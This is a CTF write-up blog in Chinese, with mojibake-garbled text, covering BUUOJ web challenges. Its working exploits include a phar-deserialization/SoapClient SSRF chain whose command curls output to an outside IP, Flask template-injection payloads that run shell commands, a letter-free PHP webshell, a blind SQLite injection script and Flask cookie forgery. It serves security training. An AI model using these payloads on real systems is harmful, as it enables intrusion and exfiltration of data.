<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $file_name;</span><br><span class="line">    <span class="keyword">public</span> $type;</span><br><span class="line">    <span class="keyword">public</span> $func = <span class="string">"Check"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file_name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name = $file_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $class = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;func);</span><br><span class="line">        $a = $class-&gt;newInstanceArgs(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        $a-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getMIME</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;type = finfo_file($finfo, <span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        finfo_close($finfo);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Check</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file_name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name = $file_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $data = file_get_contents(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        <span class="keyword">if</span> (mb_strpos($data, <span class="string">"&lt;?"</span>) !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"&amp;lt;? in contents!"</span>);<span class="comment">//åŒ¹é…åˆ°<span class="meta">&lt;?</span>ä¼šæŠ¥é”™ï¼Œè¿™é‡Œç”¨jsçš„å½¢å¼å†™ğŸ</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#func.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">"url"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i'</span>,$_POST[<span class="string">'url'</span>]))&#123;<span class="comment">//ä¸èƒ½å‡ºç°pharï¼Œå¯ä»¥ç”¨phpçš„ä¼ªåè®®ç»•è¿‡</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Go away!"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $file_path = $_POST[<span class="string">'url'</span>];</span><br><span class="line">        $file = <span class="keyword">new</span> File($file_path);</span><br><span class="line">        $file-&gt;getMIME();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your file type is '$file' &lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å®¡è®¡ï¼šå…ˆæ¥çœ‹admin.phpï¼Œè§¦å‘ç‚¹åœ¨__destruct()é­”æœ¯æ–¹æ³•ï¼Œå¯ä»¥æ‰§è¡Œcmdçš„å‘½ä»¤</p>
<p>æƒ³è¦å®ä¾‹åŒ–Adç±»ï¼Œå¿…é¡»è¦è®©$_SERVER[â€˜REMOTE_ADDRâ€™] == â€˜127.0.0.1â€™æˆç«‹ï¼Œè¿™é‡Œè¦ç”¨åˆ°SSRFæ¥è¿›è¡ŒæœåŠ¡ç«¯çš„ä¼ªé€ <del>~</del></p>
<p>class.phpä¸­çš„__wakeup()é­”æœ¯æ–¹æ³•å¯ä»¥å»ºç«‹æŸä¸ªç±»çš„åå°„ç±»ï¼Œåœ¨å®ä¾‹åŒ–è¯¥ç±»ï¼Œä¸¾ä¸ªå°ä¾‹å­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$class = <span class="keyword">new</span> ReflectionClass(<span class="string">'Person'</span>); <span class="comment">// å»ºç«‹ Personè¿™ä¸ªç±»çš„åå°„ç±»  </span></span><br><span class="line">$instance  = $class-&gt;newInstanceArgs($args); <span class="comment">// ç›¸å½“äºå®ä¾‹åŒ–Person ç±»</span></span><br></pre></td></tr></table></figure>

<p>åœ¨func.phpä¸­ï¼Œä¼šè°ƒç”¨getMIME()å‡½æ•°æ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getMIME</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;type = finfo_file($finfo, <span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        finfo_close($finfo);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ç¯‡æ–‡ç« è®²äº†finfo_open()ä¹Ÿä¼šè§¦å‘pharååºåˆ—åŒ–</p>
<p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p>
<p>popé“¾ï¼šä¸Šä¼ pharæ–‡ä»¶-&gt;è§¦å‘finfo_open()ååºåˆ—åŒ–-&gt;è§¦å‘__wakeup()-&gt;å®ä¾‹åŒ–SoapClientç±»-&gt;ssrfè®¿é—®admin.php-&gt;è§¦å‘__destruct()-&gt;ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œå‘½ä»¤è°ƒç”¨</p>
<p>ç”±äºå¯¹SoapClientç±»çš„å…·ä½“ç”¨æ³•å’ŒåŸç†ä¸äº†è§£ï¼Œå«–äº†exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'333.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'333.txt'</span>,<span class="string">'text'</span>);</span><br><span class="line">$phar-&gt;setStub(<span class="string">'&lt;script language="php"&gt;__HALT_COMPILER();&lt;/script&gt;'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file_name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $func = <span class="string">"SoapClient"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $target = <span class="string">"http://127.0.0.1/admin.php"</span>;</span><br><span class="line">        $post_string = <span class="string">'admin=1&amp;cmd=curl "http://174.2.54.253:7777"."?`/readflag`"&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3='</span>. <span class="string">"\r\n"</span>;</span><br><span class="line">        $headers = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name  = [</span><br><span class="line">            <span class="keyword">null</span>,</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,</span><br><span class="line">                  <span class="string">'user_agent'</span>=&gt; str_replace(<span class="string">'^^'</span>, <span class="string">"\r\n"</span>, <span class="string">'xxxxx^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'Content-Length: '</span>. (string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string),</span><br><span class="line">                  <span class="string">'uri'</span>=&gt;<span class="string">'hello'</span>)</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$object = <span class="keyword">new</span> File;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($object));</span><br><span class="line">$phar-&gt;setMetadata($object);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ ä¹‹åï¼Œå¼€ä¸€å°å†…ç½‘é¶æœºç›‘å¬7777ç«¯å£ï¼Œå†phpä¼ªåè®®è®¿é—®æ–‡ä»¶ä¸Šä¼ ä¹‹åçš„è·¯å¾„ï¼Œå°±ä¼šå¼¹å›shell</p>
<img src="/2020/05/30/unserialize/6.png" class="">]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>vacation1</title>
    <url>/2020/07/09/vacation1/</url>
    <content><![CDATA[<h3 id="RootersCTF2019-babyWeb"><a href="#RootersCTF2019-babyWeb" class="headerlink" title="[RootersCTF2019]babyWeb"></a>[RootersCTF2019]babyWeb<a id="more"></a></h3><img src="/2020/07/09/vacation1/1.png" class="">

<p>è¿‡æ»¤çš„ä¸œè¥¿æŒºå°‘ï¼Œä½†æ˜¯åœ¨æµ‹è¯•çš„æ—¶å€™selectã€fromç­‰éƒ½ä¼šæŠ¥sqlè¯­æ³•é”™è¯¯ï¼ŒçŒœæµ‹åå°æŸ¥è¯¢è¯­å¥ä¸ºwhere uniqueid=searchâ€,ä¹Ÿå°±æ˜¯æ²¡æœ‰å¼•å·åŒ…è£¹çš„å‚æ•°</p>
<p>ç”¨group by 3æµ‹è¯•å‡ºåº”è¯¥æœ‰2ä¸ªå­—æ®µï¼Œå°è¯•ä¸‡èƒ½å¯†é’¥ï¼Œorè¢«è¿‡æ»¤ç”¨||æ›¿ä»£ï¼ŒæŸ¥è¯¢ç¬¬ä¸€ä¸ªå­—æ®µ</p>
<p>1|| 1=1 limit 0,1 ,ç»“æœå°±å‡ºæ¥flag äº†ã€‚ã€‚ã€‚ã€‚</p>
<img src="/2020/07/09/vacation1/2.png" class="">

<p>çœ‹äº†æºç æ˜¯è¿™ä¹ˆå†™çš„</p>
<img src="/2020/07/09/vacation1/3.png" class="">

<p>ä¹Ÿå°±æ˜¯è¯´æ„é€ çš„å†…å®¹åªè¦åœ¨æ•°æ®åº“ä¸­å­˜åœ¨ä¸€æ¡æ•°æ®ï¼Œå°±ä¼šæŠŠå¯¹åº”æ•°æ®çš„å€¼èµ‹ç»™$passå¹¶è·³è½¬åˆ°flagçš„é¡µé¢</p>
<h3 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h3><p>é¢˜ç›®è¯´äº†æ˜¯flaskæ¨¡æ¿æ³¨å…¥ï¼Œç›´æ¥å»æ‰¾payloadäº†ï¼Œæ‰¾éäº†ç»ˆäºæ‰¾åˆ°äº†ä¸€ä¸ªèƒ½ç”¨çš„</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">258</span>](<span class="string">'ls'</span>,shell=<span class="literal">True</span>,stdout=<span class="number">-1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2020/07/09/vacation1/4.png" class="">

<p>æ ¹æ®é¢˜ç›®ç›´æ¥çœ‹å¯¹åº”çš„æ–‡ä»¶ä¸‹çš„ç›®å½•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls &#x2F;flasklight&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2020/07/09/vacation1/5.png" class="">

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2020/07/09/vacation1/6.png" class="">

<h3 id="virink-2019-files-share"><a href="#virink-2019-files-share" class="headerlink" title="virink_2019_files_share"></a>virink_2019_files_share</h3><p>å¼€é¢˜æ˜¯ä¸€ä¸ªé­”æ–¹ï¼Œä¸è‡³äºæ‹¼å®Œæ‰ç»™flagå§ï¼Œè¿™ä¸æ˜¯åˆéš¾æˆ‘ä¸ä¼šæ‹¼å˜›</p>
<p>æŠ“ä¸ªåŒ…æ¥çœ‹ä¸€ä¸‹</p>
<img src="/2020/07/09/vacation1/7.png" class="">

<p>çœ‹åˆ°äº†OpenRestyæœåŠ¡å™¨ï¼Œgoogleä¸€ä¸‹</p>
<img src="/2020/07/09/vacation1/8.png" class="">

<p>æœ‰ä¸ªuploadsï¼Œå…ˆè®¿é—®ä¸€ä¸‹ï¼Œåªæœ‰å›¾ç‰‡æ²¡æœ‰ä¸Šä¼ çš„ç‚¹ï¼Œè¿™é‡Œçš„æ–‡ä»¶è·¯å¾„åº”è¯¥æ˜¯preview?f=</p>
<p>åŸºäºnginxæ­å»ºçš„ï¼Œé‚£ä¹ˆæ¥çœ‹ä¸€ä¸‹é»˜è®¤é…ç½®æ–‡ä»¶è·¯å¾„ï¼Œåˆšå¥½æœ‰ä¸ªå­¦ç”Ÿæœºæ­äº†nginxï¼Œé»˜è®¤è·¯å¾„æ˜¯/etc/nginx/conf.d/default.confï¼Œç›®å½•ç©¿è¶Š</p>
<img src="/2020/07/09/vacation1/9.png" class="">

<p>ä»è¿”å›çš„æ•°æ®å¯ä»¥çœ‹å‡º../è¢«è¿‡æ»¤äº†ï¼Œè¿™é‡Œå¯ä»¥ç”¨åŒå†™ç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">preview?f&#x3D;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;etc..&#x2F;&#x2F;nginx..&#x2F;&#x2F;conf.d..&#x2F;&#x2F;default.conf</span><br></pre></td></tr></table></figure>

<img src="/2020/07/09/vacation1/10.png" class="">

<p>æ ¹æ®è¿™é‡Œçš„æç¤ºè®¿é—®preview.lua,ä½†æ˜¯å¥½åƒæ‰“ä¸é€šï¼Œé­”æ–¹ç½‘é¡µçš„æºç ç»™äº†æç¤ºï¼Œç›´æ¥è®¿é—®å¥½äº†</p>
<img src="/2020/07/09/vacation1/11.png" class="">

<h3 id="BSidesCF-2020-Hurdles"><a href="#BSidesCF-2020-Hurdles" class="headerlink" title="[BSidesCF 2020]Hurdles"></a>[BSidesCF 2020]Hurdles</h3><p>httpå¤´å¥—å¨ƒï¼Œä¸€æ­¥æ­¥æ¥å°±å¥½äº†ï¼Œä¸ä¼šå°±å»æŸ¥èµ„æ–™</p>
<img src="/2020/07/09/vacation1/12.png" class="">

<h3 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h3><p>æ–‡ä»¶ä¸Šä¼ ï¼Œæ²¡è¿‡æ»¤åç¼€ï¼Œä½†æ˜¯è¿‡æ»¤äº†æ–‡ä»¶å†…å®¹23333</p>
<p>æ…¢æ…¢æµ‹è¯•ï¼Œå‘ç°èƒ½ç”¨çš„æ²¡å‡ ä¸ªäº†<strong>$ ( ) . ; = [ ] _ ~</strong> </p>
<p>evalåœ¨php7ä¸èƒ½åŠ¨æ€è°ƒç”¨ã€‚assertå¯ä»¥ï¼ˆä¹‹å‰æ˜Ÿç›Ÿé¢è¯•çš„æ—¶å€™é‚£ä¸ªå¸ˆå‚…å‘Šè¯‰æˆ‘çš„23333ï¼‰</p>
<p>ç›´æ¥æ‰¾äº†wpé‡Œçš„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=$__=[];$___=[];$_=$__==$___;$__=~(ç°);$___=$__[$_];$__=~(åŒ—);$___.=$__[$_].$__[$_];$__=~(çš„);$___.=$__[$_];$__=~(åŠ);$___.=$__[$_];$__=~(æ‹¾);$___.=$__[$_];$____=~(~(_));$__=~(è¯´);$____.=$__[$_];$__=~(å°);$____.=$__[$_];$__=~(æ¬¡);$____.=$__[$_];$__=~(ç«™);$____.=$__[$_];$_=$$____;$___($_[_]);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¸èƒ½å‡ºç°å­—æ¯ï¼Œæœ«å°¾ä¸èƒ½å‡ºç°?&gt;ï¼Œå¹¶ä¸”è¦å†™åœ¨åŒä¸€è¡Œï¼Œå¯†ç æ˜¯_</p>
<img src="/2020/07/09/vacation1/13.png" class="">

<p>çœ‹åˆ°äº†flagï¼Œä½†æ˜¯æ˜¯ä¸ªå‡çš„2333å¡ä½äº†</p>
<p>é—®äº†ç¾¤é‡Œçš„å¸ˆå‚…ï¼Œç›´æ¥æŸ¥æ‰¾åŒ¹é…flag{}æ ¼å¼ä¹Ÿæ²¡æœ‰ï¼Œåæ¥å¦ä¸€ä¸ªå¸ˆå‚…è¯´åœ¨ç¯å¢ƒå˜é‡envé‡Œï¼Œæ‰¾åˆ°äº†â€¦</p>
<img src="/2020/07/09/vacation1/14.png" class="">

<h3 id="Wallbreaker-Easy"><a href="#Wallbreaker-Easy" class="headerlink" title="Wallbreaker_Easy"></a>Wallbreaker_Easy</h3><p>å¼€é¢˜ï¼Œè¯´æ˜ä¸­ç»™äº†æç¤ºå·²ç»ç•™äº†åé¢ï¼Œçœ‹ä¸€ä¸‹phpinfo</p>
<img src="/2020/07/09/vacation1/15.png" class="">

<p>çœ‹ä¸€ä¸‹è¢«ç¦çš„ç³»ç»Ÿè°ƒç”¨å‡½æ•°</p>
<img src="/2020/07/09/vacation1/16.png" class="">

<p>åŸºæœ¬ä¸Šéƒ½è¢«banäº†ï¼Œè¿™é‡Œçœ‹åˆ°phpçš„ç‰ˆæœ¬æ˜¯7.2çš„ï¼Œè¿™å°±è®©æˆ‘æƒ³åˆ°äº†èšå‰‘è‡ªå¸¦ç»•è¿‡disable_functionsçš„æ’ä»¶ï¼Œè¿ä¸€ä¸‹ï¼Œå±…ç„¶çœŸçš„ç»•è¿‡äº†ï¼Œç›´æ¥è¯»ä¸€ä¸‹/readflag</p>
<img src="/2020/07/09/vacation1/17.png" class="">

<p>åˆ°è¿™é‡Œè¿˜æ²¡ç»“æŸï¼Œåˆå»çœ‹äº†è¿™é¢˜çš„wpï¼Œè¿™é¢˜çš„æ­£è§£æ˜¯é€šè¿‡LD_PRELOADè¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œåœ¨ä¸»ç¨‹åºå’Œå…¶åŠ¨æ€é“¾æ¥åº“çš„ä¸­é—´åŠ è½½åˆ«çš„åŠ¨æ€é“¾æ¥åº“ï¼Œç”šè‡³è¦†ç›–æ­£å¸¸çš„å‡½æ•°åº“ï¼Œå®Œæˆç¨‹åºæ³¨å…¥å’ŒåŠ«æŒï¼Œemmmï¼Œçœ‹äº†å¥½å‡ ç¯‡æ–‡ç« ï¼ŒåŸç†æ¨¡æ¨¡ç³Šç³Šï¼Œå°±å…ˆæ”¾ç€å§ï¼Œæ”¾ä¸€ç¯‡è¯¦ç»†çš„æ–‡ç« <a href="https://www.colabug.com/2019/0529/6309031/ï¼Œä¹‹åæœ‰æ—¶é—´åœ¨å›è¿‡æ¥çœ‹çœ‹" target="_blank" rel="noopener">https://www.colabug.com/2019/0529/6309031/ï¼Œä¹‹åæœ‰æ—¶é—´åœ¨å›è¿‡æ¥çœ‹çœ‹</a></p>
<h3 id="watevrCTF-2019-Supercalc"><a href="#watevrCTF-2019-Supercalc" class="headerlink" title="[watevrCTF-2019]Supercalc"></a>[watevrCTF-2019]Supercalc</h3><img src="/2020/07/09/vacation1/18.png" class="">

<p>è®¡ç®—å™¨ï¼Œå­—æ¯è¢«è¿‡æ»¤äº†ï¼Œåªèƒ½è¾“æ•°å­—ï¼Œå°è¯•é™¤æ•°ä¸º0ï¼Œçœ‹çœ‹ä¼šä¸ä¼šæŠ¥é”™</p>
<img src="/2020/07/09/vacation1/19.png" class="">

<p>æŠ¥é”™äº†ï¼Œæš‚æ—¶æ²¡åˆ«çš„ä¿¡æ¯ï¼ŒæŠ“ä¸ªåŒ…çœ‹çœ‹</p>
<img src="/2020/07/09/vacation1/20.png" class="">

<p>çœ‹è¿™ä¸ªsessionï¼Œå¼€å§‹ä»¥ä¸ºæ˜¯jwtï¼Œä½†è§£ä¸å¼€ï¼Œä»”ç»†çœ‹çœ‹å¥½åƒè·Ÿä¹‹å‰çš„flask-cookieå·®ä¸å¤šï¼Œè§£è§£çœ‹</p>
<img src="/2020/07/09/vacation1/21.png" class="">

<p>è§£å¼€äº†ï¼Œæ˜¯ä¹‹å‰è®¡ç®—çš„å†å²ï¼Œé‚£ä¹ˆå°±æ˜¯flaskæ¨¡æ¿æ³¨å…¥äº†ï¼Œä½†æ˜¯å› ä¸ºè¿‡æ»¤ä¸èƒ½ç›´æ¥ç”¨</p>
<p>çŒœæµ‹å¯èƒ½è®¡ç®—çš„åœ°æ–¹å¯ä»¥ç”¨ï¼Œç”¨æ³¨é‡Šç¬¦è¯•è¯•</p>
<img src="/2020/07/09/vacation1/22.png" class="">

<p>æˆäº†ï¼Œæ¥çœ‹çœ‹config</p>
<img src="/2020/07/09/vacation1/23.png" class="">

<p>æ‰¾åˆ°äº†secret_keyï¼Œé‚£å°±å¯ä»¥ä¼ªé€ flask-cookieäº†</p>
<img src="/2020/07/09/vacation1/24.png" class="">

<p>å¯ä»¥å…ˆçœ‹ä¸€ä¸‹æœ‰ä»€ä¹ˆæ–‡ä»¶ï¼Œå‘ç°æœ‰flag.txtï¼Œé‚£å°±ç›´æ¥è¯»å–</p>
<img src="/2020/07/09/vacation1/25.png" class="">

<h3 id="HarekazeCTF2019-Sqlite-Voting"><a href="#HarekazeCTF2019-Sqlite-Voting" class="headerlink" title="[HarekazeCTF2019]Sqlite Voting"></a>[HarekazeCTF2019]Sqlite Voting</h3><p>sqliteæ•°æ®åº“æ³¨å…¥ï¼Œä¸€æ—¶åŠä¼šä¹Ÿæ²¡å¼„æ˜ç™½ï¼Œå…ˆè´´ä¸ªè„šæœ¬ï¼Œä¹‹åç³»ç»Ÿå»å­¦ä¹ ä¸€ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from random import randint</span><br><span class="line">from time import sleep</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def help_replace(s):</span><br><span class="line">    hex1 &#x3D; &#39;&#39;.join([hex(ord(i))[2:].zfill(2) for i in s])</span><br><span class="line">    hex2 &#x3D; &#39;&#39;.join([hex(ord(i))[2:].zfill(2) for i in hex1.upper()])</span><br><span class="line">    return &#39;||&#39;.join(hex2)</span><br><span class="line"></span><br><span class="line">def post(payload):</span><br><span class="line">    url &#x3D; &#39;http:&#x2F;&#x2F;9ff1304b-2f6c-470f-97dc-a26eee0996a7.node3.buuoj.cn&#x2F;vote.php&#39;</span><br><span class="line">    data &#x3D; &#123;&#39;id&#39;: payload&#125;</span><br><span class="line">    r &#x3D; requests.post(url, data &#x3D; data)</span><br><span class="line">    while r.status_code &#x3D;&#x3D; 429 or (r.status_code &#x3D;&#x3D; 404 and &#39;å–µ&#39; in r.text):</span><br><span class="line">        sleep(randint(1, 3))</span><br><span class="line">        r &#x3D; requests.post(url, data &#x3D; data)</span><br><span class="line">    return r</span><br><span class="line"></span><br><span class="line">def check(temp, guess):</span><br><span class="line">    payload &#x3D; temp.format(guess)</span><br><span class="line">    r &#x3D; post(payload)</span><br><span class="line">    if &#39;An error occurred while updating database&#39; not in r.text:</span><br><span class="line">        return True</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line">strs &#x3D; &#39;0123456789abcdef-&#125;&#39;</span><br><span class="line">flag &#x3D; &#39;flag&#123;&#39;</span><br><span class="line">length &#x3D; &#39;abs(case(replace(length((select(flag)from(flag))),&#123;&#125;,trim(0,0)))when(trim(0,0))then(0x100)else(0x8000000000000000)end)&#39;</span><br><span class="line">info &#x3D; &#39;abs(case(replace(length(replace(hex(hex((select(flag)from(flag)))),&#123;&#125;,trim(0,0))),&#123;&#125;,trim(0,0)))when(trim(0,0))then(0x100)else(0x8000000000000000)end)&#39;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"># length 42</span><br><span class="line">for i in range(1, 101):</span><br><span class="line">    if(check(length, i)):</span><br><span class="line">        print(&#39;length:&#39;, i)</span><br><span class="line">        break</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">for i in range(1, 38):</span><br><span class="line">    for s in strs:</span><br><span class="line">        guess &#x3D; flag + s</span><br><span class="line">        if(check(info.format(&#39;&#123;&#125;&#39;, (37 - i) * 4), help_replace(guess))):</span><br><span class="line">            flag &#x3D; guess</span><br><span class="line">            print(flag)</span><br></pre></td></tr></table></figure>

<h3 id="FBCTF2019-Event"><a href="#FBCTF2019-Event" class="headerlink" title="[FBCTF2019]Event"></a>[FBCTF2019]Event</h3><p>ç™»å½•æ³¨å†Œä¸€å—çš„ï¼Œç›´æ¥å¡«ä¸ªè´¦å·å°±å¯ä»¥äº†</p>
<img src="/2020/07/09/vacation1/26.png" class="">

<p>éšä¾¿å¡«ä¸€ä¸‹æŠ“ä¸ªåŒ…çœ‹ä¸€ä¸‹</p>
<img src="/2020/07/09/vacation1/27.png" class="">

<p>èµ¶å·§äº†ï¼Œcookieåˆæ˜¯flask-cookieé‚£ç§å½¢å¼</p>
<img src="/2020/07/09/vacation1/28.png" class="">

<p>æ„Ÿè§‰ç‚¹ä¸åœ¨è¿™é‡Œï¼Œè¯•è¯•æ¨¡æ¿æ³¨å…¥ï¼Œè¿™é‡Œæµ‹è¯•åä¸èƒ½ç”¨è¿™ç§å½¢å¼</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2020/07/09/vacation1/29.png" class="">

<img src="/2020/07/09/vacation1/30.png" class="">

<p>æ‰¾åˆ°äº†secret_key,è¿™é‡Œadminçš„cookieéœ€è¦è‡ªå·±æ¥å†™flaskæ¥åˆ¶é€ ç­¾å</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line">app.secret_key &#x3D; b&#39;fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y&#39;</span><br><span class="line">session_serializer &#x3D; SecureCookieSessionInterface().get_signing_serializer(app)</span><br><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">def index():</span><br><span class="line">    print(session_serializer.dumps(&quot;admin&quot;))</span><br><span class="line">index()</span><br></pre></td></tr></table></figure>

<img src="/2020/07/09/vacation1/31.png" class="">

<p>ç„¶åæ›¿æ¢æ‰userå¯¹åº”çš„cookieï¼Œå°±èƒ½æ‹¿flagäº†</p>
<img src="/2020/07/09/vacation1/32.png" class="">

<h3 id="RootersCTF2019-ImgXweb"><a href="#RootersCTF2019-ImgXweb" class="headerlink" title="[RootersCTF2019]ImgXweb"></a>[RootersCTF2019]ImgXweb</h3><p>æ³¨å†Œï¼Œadminä¸èƒ½ç”¨åšusernameã€ï¼Œåº”è¯¥æ˜¯å·²æœ‰çš„è´¦å·ï¼Œéšä¾¿æ³¨å†Œä¸€ä¸ªï¼Œä¸Šä¼ ä¸ª.htaccessï¼ŒæŠ“ä¸ªåŒ…</p>
<img src="/2020/07/09/vacation1/33.png" class="">

<p>çœ‹åˆ°cookieï¼ŒjwtåŠ å¯†æ²¡è·‘äº†ï¼Œè§£ä¸€ä¸‹çœ‹ä¸€ä¸‹æ˜¯ä»€ä¹ˆæ•°æ®</p>
